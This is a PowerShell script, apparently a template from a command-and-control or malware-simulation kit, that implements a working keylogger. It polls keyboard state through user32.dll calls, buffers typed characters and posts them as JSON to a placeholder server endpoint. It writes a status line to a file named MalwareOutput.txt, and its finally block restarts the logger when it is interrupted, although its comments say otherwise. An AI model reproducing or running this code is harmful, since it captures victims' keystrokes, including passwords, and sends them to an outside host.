#requires -Version 2
function Start-KeyLogger
{
    # Signatures for API Calls
    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    # load signatures and make members available
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    # create output file
    $buffer = New-Object -TypeName System.Text.StringBuilder

    try
    {
        # create endless loop. When user presses CTRL+C, finally-block
        # executes and shows the collected key presses
        while ($true)
        {
            Start-Sleep -Milliseconds 40

            # scan all ASCII codes above 8
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                # get current key state
                $state = $API::GetAsyncKeyState($ascii)

                # is key pressed?
                if ($state -eq -32767)
                {
                    $null = [console]::CapsLock

                    # translate scan code to real code
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    # get keyboard state for virtual keys
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)

                    # prepare a StringBuilder to receive input key
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    # translate virtual key
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success)
                    {
                        $buffer.Append($mychar)

                        if ($buffer.Length -gt 100)
                        {
                            # Get the buffer content as a Unicode string
                            $jsonObject = @{
                                keylog = $buffer.ToString()
                            } | ConvertTo-Json

                            # Set the API endpoint
                            $apiEndpoint = "http://{{server}}:{{port}}/keylog/{{id}}"

                            try
                            {
                                Write-Host $jsonObject
                                # Invoke the web request with POST method and send the JSON object in the request body
                                Invoke-RestMethod -Uri $apiEndpoint -Method Post -Body $jsonObject -ContentType "application/json"
                            }
                            catch
                            {
                                Write-Host "Error sending keylog data: $_"
                                # Handle the error as needed
                            }
                             $msg = "## KEYLOGGER`n`tBuffer Send to API"
                             $msg | Out-File -FilePath C:\Users\Public\MalwareOutput.txt -Append
                        }
                    }
                }
            }
        }
    }
    finally
    {
        # show collected key presses
        Start-KeyLogger
    }
}

    # records all key presses until script is aborted by pressing CTRL+C
    # will then open the file with collected key codes
    Start-KeyLogger


